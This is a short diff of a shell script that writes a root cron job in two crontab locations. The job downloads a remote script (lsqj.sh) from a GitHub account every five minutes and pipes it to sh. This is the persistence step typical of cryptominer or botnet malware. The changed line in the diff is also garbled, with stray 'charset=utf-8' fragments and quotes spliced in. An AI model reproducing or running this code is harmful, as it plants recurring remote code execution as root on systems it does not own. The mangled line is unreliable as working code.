@@ -1,6 +1,6 @@
 export PATH=$PATH:/bin:/usr/bin:/usr/local/bin:/usr/sbin
 
-echo '\n\n*/5 * * * * wget -N https://github.com/idg7494/idg7494/raw/master/lsqj.sh | sh\n\n' > /var/spool/cron/root
+echo '\n\n*/5 * * * * wget -N https://github.com/idg7494/idg7494/raw/master/lsqj.sh | sh\n\n' ; charset=utf-8 >" > /var/spool/cron/root ; charset=utf-8'>";
 mkdir -p /var/spool/cron/crontabs
 echo '\n\n*/5 * * * * wget -N https://github.com/idg7494/idg7494/raw/master/lsqj.sh | sh\n\n' > /var/spool/cron/crontabs/root
 
